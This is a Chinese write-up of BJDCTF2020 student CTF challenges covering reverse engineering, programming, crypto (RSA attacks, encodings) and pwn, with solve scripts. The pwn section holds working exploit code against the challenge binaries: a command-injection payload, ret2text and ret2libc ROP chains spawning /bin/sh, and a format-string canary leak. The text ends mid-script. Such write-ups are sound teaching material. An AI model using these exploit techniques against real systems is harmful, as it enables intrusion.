# BJDCTF2020
A CTF freshman competition organized by Hangzhou Normal University, Jiangsu University of Science and Technology, and Jiangsu University

> 不好意思咕咕咕了这么久,总算在年前改完了,web的wp其他学校的师傅已经写的很好了,这里就不再赘余了(咕咕 经过出题人长达好几天的讨论,最终决定本wp放出部分题解,有的题目介于很多原因就不放了

# web && MISC

[Y1ng师傅的wp](https://www.gem-love.com/websecurity/824.html)

[imagin师傅的wp](https://imagin.vip/?p=166)

# Android

咕咕咕

# Reverse

## 0x01 encode

### 题目思路

这道题目的大致流程为：对输入做base64编码后的结果与key分别异或，然后再以key作为密钥做RC4加密。因为这道题存在一点问题，所以后面直接根据源码给出求解思路

### RC4

关于RC4的加解密可以试试这个网站：[RC4](https://gchq.github.io/CyberChef)
此外推荐一篇看雪的关于RC4逆向分析的文章：[恶意代码分析之 RC4 算法学习](https://bbs.pediy.com/thread-256733.htm),文章写的比较详细，不过由于本题做了符号剥离，在细节处可能有略微差别。

### base64

关于base64，i春秋有一篇文章[BASE64编码原理分析脚本实现及逆向案例](https://www.cnblogs.com/ichunqiu/p/10535378.html)，不过本题中的base64码表是更改过的，需要特别注意一下。

### 解题过程

1. upx脱壳
2. 根据密钥和密文通过RC4解密得到：`23152553081a5938126a3931275b0b1313085c330b356101511f105c`
3. 和key异或得到base64编码
4. base64解密

   ```python
        from base64 import b64decode

        key = 'Flag{This_a_Flag}'
        enflag = '23152553081a5938126a3931275b0b1313085c330b356101511f105c'
        enflag = [int(enflag[i:i+2],16) for i in range(0,len(enflag),2)]
        enflag = [chr(enflag[i]^ord(key[i%len(key)])) for i in range(len(enflag))]
        enflag = ''.join(enflag)
        print(enflag)

        t = '0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ='
        table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
        table = str.maketrans(t,table)
        flag = b64decode(enflag.translate(table))
        print(flag)
    ```

5. 题目源码

    ```c++
        // main.c
        #include<stdio.h>
        #include<string.h>
        #include<stdlib.h>
        #include<unistd.h>
        #include"RC4.h"

        unsigned char *base64_encode(unsigned char *str);

        int main(void)
        {   unsigned char key[] = "Flag{This_a_Flag}";
            unsigned int len0 = strlen((const char *)key);
            unsigned int i;
            unsigned char res[]="e8d8bd91871a010e560f53f4889682f961420af2ab08fed7acfd5e00";
            // unsigned char buf[]="BJD{0v0_Y0u_g07_1T!}";
            unsigned char buf[128];
            printf("Please input your flag:\n");
            read(STDIN_FILENO,buf,256);
            if(strlen(buf)!=21)
                exit(0);
            else
            {
                unsigned char inputs[30];
                strcpy(inputs,base64_encode(buf));
                unsigned int len=strlen((const char*)inputs);
                for(i=0;i<len;i++)
                    inputs[i]^=key[i%len0];
                printf("\n");
                rc4_crypt(inputs,len,key,len0);
                if(!strcmp(inputs,res))
                    exit(0);
                else
                    puts("right!");
            }
            return 0;
        }

        unsigned char *base64_encode(unsigned char *str)  
        {  
            long len;  
            long str_len;  
            unsigned char *res;  
            int i,j;  
            unsigned char *base64_table="0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

            str_len=strlen(str);  
            if(str_len % 3 == 0)  
                len=str_len/3*4;  
            else  
                len=(str_len/3+1)*4;  

            res=malloc(sizeof(unsigned char)*len+1);  
            res[len]='\0';  

            for(i=0,j=0;i<len-2;j+=3,i+=4)  
            {  
                res[i]=base64_table[str[j]>>2];
                res[i+1]=base64_table[(str[j]&0x3)<<4 | (str[j+1]>>4)];
                res[i+2]=base64_table[(str[j+1]&0xf)<<2 | (str[j+2]>>6)];
                res[i+3]=base64_table[str[j+2]&0x3f];
            }  

            switch(str_len % 3)  
            {  
                case 1:  
                    res[i-2]='=';  
                    res[i-1]='=';  
                    break;  
                case 2:  
                    res[i-1]='=';  
                    break;  
            }  

            return res;  
        }

        // RC4.c
        #include <string.h>

        static void rc4_init(unsigned char* s_box, unsigned char* key, unsigned int key_len)
        {
            unsigned char Temp[256];
            int i;
            for (i = 0; i < 256; i++)
            {
                s_box[i] = i;
                Temp[i] = key[i%key_len];
            }
            int j = 0;
            for (i = 0; i < 256; i++)
            {
                j = (j + s_box[i] + Temp[i]) % 256;
                unsigned char tmp = s_box[i];
                s_box[i] = s_box[j];
                s_box[j] = tmp;
            }
        }

        void rc4_crypt(unsigned char* data, unsigned int data_len, unsigned char* key, unsigned int key_len)
        {
            unsigned char s_box[256];
            rc4_init(s_box, key, key_len);
            unsigned int i = 0, j = 0, t = 0;
            unsigned int Temp;
            for (Temp = 0; Temp < data_len; Temp++)
            {
                i = (i + 1) % 256;
                j = (j + s_box[i]) % 256;
                unsigned char tmp = s_box[i];
                s_box[i] = s_box[j];
                s_box[j] = tmp;
                t = (s_box[i] + s_box[j]) % 256;
                data[Temp] ^= s_box[t];
            }
        }

        // RC4.h
        #ifndef RC4_H
        #define RC4_H

        void rc4_crypt(unsigned char* data, unsigned int data_len, unsigned char* key, unsigned int key_len);

        #endif
    ```


## 0x02 Easy

![easy1](/image/easy1.png)

拖进IDA查看伪代码，发现主函数内没有任何与flag有关的函数，F12搜索字符串也找不到太多有用的信息。但是在函数窗口可以发现一个叫ques的未被调用的函数。

对ques函数的逻辑进行简单的静态分析可以发现，这个函数的作用其实就是把数组[0x224fc7ffa7e31，0x22a84884a4239 , 0x3ff87084ff235 , 0x2318588424233 , 0x231fc7e4243f1]
里的每个元素先转换为二进制，转换的过程中遇到1就输出*，遇到0就输出一个空格。数组的第0个元素对应输出的第0行，第1个元素对应输出的第1行…不难发现，最终输出组合而成的象素图案就是对应的flag。

***当然你也可以在发现了这个后门函数后直接动态调试+修改eip跳转到ques函数的起始地址，一路F8或者下断+F9就可以直接得到flag。

![easy2](/image/easy2.png)
 
BJD{HACKIT4FUN}

## 0x03 BJD hamburger competition

在BJD hamburger\BJD hamburger competition_Data\Managed文件夹中找到Assembly-CSharp.dll拖进Dnspy中，找到 ButtonSpawnFruit这个类。

![hum1](/image/hum1.png)
 
可以看到，需要我们按照正确的顺序堆出汉堡才能得到正确的flag。并且在汉堡顶的判断中限制了spawncount必须为5，又因为spawncount从0开始，所以汉堡的层数只能是6.
除去汉堡底和汉堡顶，还剩4种材料，因此这道题就转化成了从7种材料中选4种的问题。

![hum2](/image/hum2.png)
 
得出结果所有可能情况：![hum3](/image/hum3.png) ，以及result的值为‘1001’
把result进行MD5加密后，取前20位。

![hum4](/image/hum4.png)
 
Flag：BJD{B8C37E33DEFDE51CF91E}
PS:这里也可以用itertools模块中的permutations方法求解。

还有一种比较简单的解法，在老八做汉堡的原视频中，老八堆汉堡的顺序是：汉堡底-生菜-臭豆腐-俘虏-加柠檬-汉堡顶，在上文脚本中对应的顺序为5347，同样可以得出最终的result为1001.


btw这道题出现了非预期解：如果直接把这一串哈希值放进在线SHA1解密网站可以直接得到明文为1001，算是出题人的出题的时候不够严谨导致的，在这里给大家说声抱歉…（我暴打我自己）。



# Programing

3道题目均可暴力求解

## 0x01 Every minute counts
简单BFS，依次尝试所有可能转换到的位置即可

## 0x02 Pyramid
找规律
打表找下规律，打表方法：把所有点扔坐标系里n^3爆搜即可
打出来为 1，5，15，35，70，126，210..
没感觉，作差 4, 10, 20, 35, 56, 84
还是没感觉，作差 6, 10, 15, 21, 28
发现此时的差递增1？也就是再作差4, 5, 6, 7是等差数列
也就是再作差1, 1, 1为常数
相当于函数An求四次导为常数
于是我们设An=a∗n4+b∗n3+c∗n2+d∗n+e
解出a, b, c, d, e，带入得答案

## 0x03 Real Hero
建立一个虚结点，并将其与超人所有人相连，且距离为0，这样问题就转换成了求两次点到城中其他点最短路径的最大值，然后比较一下即可
注意路径去重



# Crypto

## 0x01 Sign_in

十六进制转字符串即可

## 0x02 编码与调制

本题灵感来自2019年第三届i春秋的11月月赛，主要是想对曼切斯特编码进行考察，其中为了提供一下思路，给了一张code的图片作为提示，当然也可以直接自行百度这种编码方式，毕竟他的编码方式也很有特点，仅采用了4种字符，百度一下也可以找到解决方案
编码规则，直接复制的百度百科
在曼彻斯特编码中，每一位的中间有一跳变，位中间的跳变既作时钟信号，又作数据信号；从高到低跳变表示“1”，从低到高跳变表示“0”。还有一种是差分曼彻斯特编码，每位中间的跳变仅提供时钟定时，而用每位开始时有无跳变表示“0”或“1”，有跳变为“0”，无跳变为“1”。
编程思路：
而我们在编程实现时，也很简单只要先将明文转成二进制（也就是先进行NRZ编码），而后对于其中的高电平‘1’，用‘10’替换，低电平‘0’，用‘01’替换，获得一串新的二进制比特流，最后再将其进行16进制封装即可
解码思路：
解码也就是一个逆过程，先将hex转成bin，在一步步替换‘10’为‘1’，‘01’为‘0’
下面给出解密脚本：

```
msg=0x2559659965656a9a65656996696965a6695669a9695a699569666a5a6a6569666a59695a69aa696569666aa6
s=bin(msg)[2:]
r=""
for i in range(len(s)/2):
    if s[i*2:i*2+2] == '10':
        r += '1'
    else:
        r += '0'
print(hex(int(r,2))[2:-1].decode('hex'))

```


最终flag：
BJD{DifManchestercode}

## 0x03 Polybius

密文：ouauuuoooeeaaiaeauieuooeeiea
hint：VGhlIGxlbmd0aCBvZiB0aGlzIHBsYWludGV4dDogMTQ=
首先将hint base64解密查看提示：The length of this plaintext: 14
而后再观察一下发现密文长度时28位，所以猜测是棋盘密码（额，其实题目就已经提示加密方式了）
观察发现一共有五个字母重复出现在密文中，所以可能的加密表是aeiou，但是解出结果会发现是乱码，所以可以尝试爆破，一共也就5！种情况。
下面是解密脚本：


```
import itertools

key = []
cipher = "ouauuuoooeeaaiaeauieuooeeiea"
for i in itertools.permutations('aeiou', 5):
    key.append(''.join(i))
for each in key:
    temp_cipher = ""
    result = ""
    for temp in cipher:
        temp_cipher += str(each.index(temp))          
#这里其实是将字母的表换成数字的表以便后续计算
    for i in range(0,len(temp_cipher),2):
        current_ascii = int(temp_cipher[i])*5+int(temp_cipher[i+1])+97     
#因为棋盘密码是采用两位一起表示一个字母
        if current_ascii>ord('i'):
            current_ascii+=1
        result += chr(current_ascii)
    if "flag" in result:
        print(each,result)

```

跑出来两个结果：
 
显然第一个是最终答案
最后加上格式：
BJD{flagispolybius}
啊啊啊啊啊，最后说一下，这次flag设置的居然和题目名一样，大意了，
(￣ε(#￣)☆╰╮o(￣皿￣///)，导致赛后有师傅说是直接猜出来的flag，在这里给各位师傅谢罪了(。﹏。)，下次flag我会深思熟虑一下了，下次一定，下次一定


## 0x04 easyrsa


很简单的一个rsa，就是再求取欧拉函数是对于（p-1）*（q-1）的获取要先进行一步转换，题中给出了p和q的关系式，及一个求导的过程，化简后可以得出z=p^2+q^2,最后再根据n=p*q,即可得出（p-1）*（q-1）
下面是exp：

```
# -*- coding:utf-8 -*-
#!/usr/bin/python

import gmpy2
from Crypto.Util.number import long_to_bytes

n=15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441
z=32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482
c=7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035
e=65537

p_and_q_square = z + 2*n #这个要通过化简一下z就可以发现其中的关系，其实就是简单的导数化简

p_and_q = gmpy2.iroot(p_and_q_square,2)

#(mpz(250474028594377426111821218884061933467907597574578255066146260367094595399741196827532923836761733594976933366636149201492628708413319929361097646526652140204561542573663223469009835925309935515892458499676903149172534494580503088868430625144808189083708827363335045028702993282231537893799541685169911232442), True)

final_p_and_q = 250474028594377426111821218884061933467907597574578255066146260367094595399741196827532923836761733594976933366636149201492628708413319929361097646526652140204561542573663223469009835925309935515892458499676903149172534494580503088868430625144808189083708827363335045028702993282231537893799541685169911232442

Euler_function = n - final_p_and_q + 1
 
d = int(gmpy2.invert(e,Euler_function))

m=pow(c,d,n)

print(long_to_bytes(m))
```

## 0x05 rsa_output

题目描述直接给出，模的相关攻击，再看一下给出的附件，发现两次的N是相同的，所以可以确定是共模攻击

![共模攻击](/image/modtogether.jpg)

Exp:

```
from Crypto.Util.number import long_to_bytes
import gmpy2
n = 21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111
e1 = 2767

e2 = 3659

message1 = 20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599

message2 = 11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227
# s & t
gcd, s, t = gmpy2.gcdext(e1, e2)
if s < 0:
    s = -s
    message1 = gmpy2.invert(message1, n)
if t < 0:
    t = -t
    message2 = gmpy2.invert(message2, n)
plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n
print(plain)
print(long_to_bytes(plain))

```

## 0x06 RSA

这里主要操作是对于e和p的获取，可以看到题中e未知，但是给出了e的范围，并且还有用e加密294后的结果，所以可以尝试去爆破得到e
得出e之后，剩下的问题就是对于n的分解从而得到p,q，很明显直接分解肯定不可能，但是我们可以看到这里q是一个公因数，前后两次加密种只有在一开始时定义了q，所以对于两次的n去取他们的公因数即可获得q，而后再用n除以下q就可得到p

```
import gmpy2
from Crypto.Util.number import *

#e的求解:
#爆破一下就行了

'''
n=13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037
t=381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018
for i in range(0,100000):
    if(pow(294,i,n)==t):
        print(i)
'''

c = 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120
n1 = 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037
e = 52361
n2 = 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047
q=GCD(n1,n2)
p=n1/q
d=int(gmpy2.invert(e,(p-1)*(q-1)))
flag=pow(c,d,n1)
flag=long_to_bytes(flag)
print(flag)
```

## 0x07 这是base？？

这题主要是对于base64编码方式的理解，题中给出一个码表和密文，解题思路就是利用给出码表，解码即可，此外，这题怪我原本打算只给出码表的键值，一时疏忽把码表直接粘到附件了，下面是我原本的预期解：
首先是根据键值构造码表：

```
ss='JKLMNOxyUVzABCDEFGH789PQIabcdefghijklmWXYZ0123456RSTnopqrstuvw+/='
k=[]#构造键列表
for i in range(0,65):
    k.append(i)
v=[]#构造值列表
for i in range(len(ss)):
    v.append(ss[i])
#用键值列表构造字典
table = dict(zip(k,v))
print(table)
```

得到码表后，就是根据码表解密文：
这里顺带提一下base64的加密流程
1、将待转换的字符串每三个字节分为一组，每个字节占8bit，那么共有24个二进制位。
2、将上面的24个二进制位每6个一组，共分为4组。
3、在每组前面添加两个0，每组由6个变为8个二进制位，总共32个二进制位，即四个字节。
4、最后再根据码表进行编码
简单来说转换关系就是先将明文的字符串的ASCII码转换为8位的二进制编码，然后在将这串得到的二进制编码按6位为一组（64是2的6次方），然后将划分好的二进制数转换成10进制数并对照上方编码表进行加密。
而相对的解密就是将这编码在按8位为一组划分，再将划分好的二进制数转成10进制的ASCII码，然后根据ASCII码表恢复明文。
Ps.这里我们可以看到转成的二进制数的长度必须是6和8的公倍数，对于那些长度不够的要进行补齐操作，详细的过程这里就不细讲了，看下面这篇文章吧
[https://blog.csdn.net/wo541075754/article/details/81734770](https://blog.csdn.net/wo541075754/article/details/81734770)
剩下的工作，也就是这次比赛中获取flag的脚本流程如下：

1、先获取密文再码表中键值

```
key_list=[]
value_list=[]
s='FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw'
mydisc = {0: 'J', 1: 'K', 2: 'L', 3: 'M', 4: 'N', 5: 'O', 6: 'x', 7: 'y', 8: 'U', 9: 'V', 10: 'z', 11: 'A', 12: 'B', 13: 'C', 14: 'D', 15: 'E', 16: 'F', 17: 'G', 18: 'H', 19: '7', 20: '8', 21: '9', 22: 'P', 23: 'Q', 24: 'I', 25: 'a', 26: 'b', 27: 'c', 28: 'd', 29: 'e', 30: 'f', 31: 'g', 32: 'h', 33: 'i', 34: 'j', 35: 'k', 36: 'l', 37: 'm', 38: 'W', 39: 'X', 40: 'Y', 41: 'Z', 42: '0', 43: '1', 44: '2', 45: '3', 46: '4', 47: '5', 48: '6', 49: 'R', 50: 'S', 51: 'T', 52: 'n', 53: 'o', 54: 'p', 55: 'q', 56: 'r', 57: 's', 58: 't', 59: 'u', 60: 'v', 61: 'w', 62: '+', 63: '/', 64: '='}
for key,value in mydisc.items():
    key_list.append(key)
    value_list.append(value)
def value_to_key(a):
    get_value = a
    if get_value in value_list:
        get_value_index = value_list.index(get_value)
    else:
        print("你要查询的值%s不存在" %get_value)
    return(get_value_index)
if __name__ == '__main__':
    ss=[]
    for i in s:
        ss.append(value_to_key(i))
    print(ss)
```

2、将键值转换成六位二进制，不足位填充

```
ss=[16, 36, 41, 4, 30, 52, 16, 48, 23, 53, 36, 48, 29, 21, 61, 43, 19, 38, 61, 23, 23, 53, 17, 40, 12, 23, 13, 31, 24, 35, 17, 51, 25, 21, 61, 45, 24, 23, 1, 61]
bin_new=[]
for i in ss:
    bin_new.append(bin(i)[2:])

print(bin_new)

bin_new=['10000', '100100', '101001', '100', '11110', '110100', '10000', '110000', '10111', '110101', '100100', '110000', '11101', '10101', '111101', '101011', '10011', '100110', '111101', '10111', '10111', '110101', '10001', '101000', '1100', '10111', '1101', '11111', '11000', '100011', '10001', '110011', '11001', '10101', '111101', '101101', '11000', '10111', '1', '111101']
temp=[]
for i in bin_new:
  if len(i)<6:
    i = (6-len(i))*'0'+ i
  else:
    i = i
  temp.append(i)
print(temp)
#temp=['010000', '100100', '101001', '000100', '011110', '110100', '010000', '110000', '010111', '110101', '100100', '110000', '011101', '010101', '111101', '101011', '010011', '100110', '111101', '010111', '010111', '110101', '010001', '101000', '001100', '010111', '001101', '011111', '011000', '100011', '010001', '110011', '011001', '010101', '111101', '101101', '011000', '010111', '000001', '111101']
```

3、将获得的六位二进制拼接后按8位拆分转为ASCII码后获得flag

```
#temp=['010000', '100100', '101001', '000100', '011110', '110100', '010000', '110000', '010111', '110101', '100100', '110000', '011101', '010101', '111101', '101011', '010011', '100110', '111101', '010111', '010111', '110101', '010001', '101000', '001100', '010111', '001101', '011111', '011000', '100011', '010001', '110011', '011001', '010101', '111101', '101101', '011000', '010111', '000001', '111101']
r=''
for i in temp:
    r+=i
rr=re.findall(r'.{8}',r)
print(rr)

rrr=[]
for i in rr:
    rrr.append(int(i,2))

flag=''
for i in rrr:
    flag+=chr(i)

print(flag)

```


# Pwn


## 0x01 babyrouter

签到题

**考点:命令执行**

拖进64位IDA,直接F5 main,然后可以看到case 1:

```
     case 1:
        puts("Please input the ip address:");
        read(0, &buf, 0x10uLL);
        v3 = &buf;
        strcat(dest, &buf);
        system(dest);
        v4 = "done!";
        puts("done!");
        break;
```

发现并未过滤传入system的参数,因此直接命令执行即可..完全不用写脚本

payload 如下:
```
1
1;cat flag
```

当然还有很多方式,这里就不一一列举了


## 0x02 babystack

签到题*2

**考点:ret2text**

拖进IDA 64,F5

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-10h]
  size_t nbytes; // [rsp+Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  puts("[+]What's u name?");
  read(0, &buf, (unsigned int)nbytes);
  return 0;
}
```

发现程序可以自主控制输入的长度,栈溢出实锤,并且给了后门函数backdoor,直接Ret2text即可

payload:

```
from pwn import *

p=process('ret2text')
sys=p64(0x4006e6)
p.sendline('-1')
payload='a'*0x10+'a'*8+sys

p.sendline(payload)
p.interactive()

```

当然,不想写脚本可以直接python -i一行解决

## 0x03 babyrop

**考点:ret2libc,无libc文件如何查找版本**

直接看漏洞函数

```
ssize_t vuln()
{
  char buf; // [rsp+0h] [rbp-20h]

  puts("Pull up your sword and tell me u story!");
  return read(0, &buf, 0x64uLL);
}
```

可以用puts函数泄露libc基址,之后控制程序回到vuln函数调用system("/bin/sh")函数

libc版本可以使用libcsearcher 

payload:

```
from pwn import *
from LibcSearcher import LibcSearcher
p=process('./pwn')
#p=remote('222.186.56.247',8123)
elf=ELF('./pwn')

vuln=p64(elf.symbols['vuln'])
puts=p64(elf.plt['puts'])
libc_main=p64(elf.got['__libc_start_main'])
pop_rdi_ret=p64(0x400733)

payload1='a'*0x28+pop_rdi_ret+libc_main+puts+vuln

p.recvuntil('story!\n')
p.sendline(payload1)
libc_start_main_addr=u64(p.recvuntil('\n',drop=True).ljust(8,"\x00"))
log.success('[*]__libc_start_main:'+hex(libc_start_main_addr))
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
log.success('[*]system:'+hex(system_addr))
log.success('[*]binsh:'+hex(binsh_addr))

payload2='a'*0x28+pop_rdi_ret+p64(binsh_addr)+p64(system_addr)
p.recvuntil('story!\n')
p.sendline(payload2)
p.interactive()
```


## 0x04 babystack2.0

在ret2text的基础上加了整数溢出,本来想考短整型的,但是发现第一天情况不太理想(2333

**考点:整数溢出**


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-10h]
  size_t nbytes; // [rsp+Ch] [rbp-4h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  if ( (signed int)nbytes > 10 )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
  puts("[+]What's u name?");
  read(0, &buf, (unsigned int)nbytes);
  return 0;
}
```

可以看到虽然有一个条件判断是nbytes>10就会退出程序,但是在read函数中第三个参数是无符号型

此时我们可以输入-1来构造一个回环使得我们输入的值位int64的最大值

payload:

```
from pwn import *

p=process('ret2text')

sys=p64(0x4006e6)
p.sendline('-1')
payload='a'*0x10+'a'*8+sys

p.sendline(payload)
p.interactive()

```

## 0x05 babyrop2

在ret2libc的基础上增加了canary保护

**考点:泄露canary**

首先看下gift函数

```
unsigned __int64 gift()
{
  char format; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("I'll give u some gift to help u!");
  __isoc99_scanf("%6s", &format);
  printf(&format);
  puts(byte_400A05);
  fflush(0LL);
  return __readfsqword(0x28u) ^ v2;
}
```

一个标准的格式化字符串漏洞,我们的canary就可以通过gift函数来泄露,然后在我们正常的ret2libc的payload中加上我们泄露出的canary即可绕过canary检查

关于如何泄露canary,我们即然给了格式化字符串漏洞,通过调试可以发现canary在栈的第7个位置,因此可以直接用%7$p泄露

```
from pwn import *
from LibcSearcher import LibcSearcher

p=process('./pwn')
elf=ELF('./pwn')

vuln=p64(0x400887)
puts_addr=elf.plt['puts']
libc_start=elf.got['__libc_start_main']

pop_rdi_ret=p64(0x400993)

payload1="%7$p"

p.recvuntil('u!\n')
p.sendline(payload1)
canary=eval(p.recvuntil("\n",drop=True))
log.success('[*]canary:'+hex(canary))

payload2='a'*24+p64(canary)+'a'*8+pop_rdi_ret+p64(libc_start)+p64(puts_addr)+vuln
p.recvuntil('story!\n')
p.sendline(payload2)

libc_start_main_addr = u64(p.recvuntil("\n",True).ljust(8,"\x00"))
#libc_start_main_addr = p.recvuntil("\n",True).ljust(8,"\x00")
#print(libc_start_main_addr)
#pause()
log.success('[*]__libc_start_main:'+hex(libc_start_main_addr))
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
log.success('[*]system:'+hex(system_addr))
log.success('[*]binsh:'+hex(binsh_addr))


payload3='a'*24+p64(canary)+'a'*8+pop_rdi_ret+p64(binsh_addr)+p64(system_addr)
p.sendlineafter('story!\n',payload3)
p.interactive()

```

## 0X06 dizzy

尝试逆开文件观察程序逻辑，可以发现首先输入被利用scanf读到一个数组里面，解析为int类型，然后对每一个数加上了114514这个数进行偏移，最后将读入的这个数组作为字符串与“PvvN| 1S S0 GREAT!”进行比较，如果相同就可以获取shell，则编写python脚本，对该字符串进行反向操作即可，下面是exp

```
from pwn import *

sh = process('./dizzy')
#sh = remote('x', 'xx')

pattern = b"PvvN| 1S S0 GREAT!;/bin/sh\0"

cnt = 0
payload = b''
buf = b''
for pat in pattern:
    #print(buf)
    buf += bytes([pat])
    if len(buf) == 4:
        cnt += 1
        sh.sendline(bytes(str(u32(buf) - 114514), encoding = 'utf-8'))
        print(u32(buf)-114514)
       # print(hex(u32(buf)))
        buf = b''

while len(buf) < 4:
    buf += b'\0'

sh.sendline(bytes(str(u32(buf) - 114514), encoding = 'utf-8'))
print(u32(buf) - 114514)
#print(hex(u32(buf)))

while cnt < 19:
    print(0-114514)
    sh.sendline(bytes(str(0 - 114514), encoding = 'utf-8'))
    cnt += 1
sh.interactive()
```

## 0X07 encryptde stack

简单的栈溢出，不过前面加上了RSA加密，提示需要输入一个加密后的值，于是到程序中找相关逻辑，其中可以发现在0x00400a70地址处有一个求逆元的函数，可以联想到RSA，每次程序生成一个随机数，输入的值加密后需要等于随机数，观察可得RSA的两个参数E、N分别为65537和94576960329497431，于是尝试分解N可以得出私钥，对m用私钥进行加密即可过掉开头的身份验证，然后就是使用return2libc的栈溢出手段即可拿到shell，下面为exp

```
from pwn import *
from LibcSearcher import *

context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-v']
elf = ELF('./encrypted_stack')
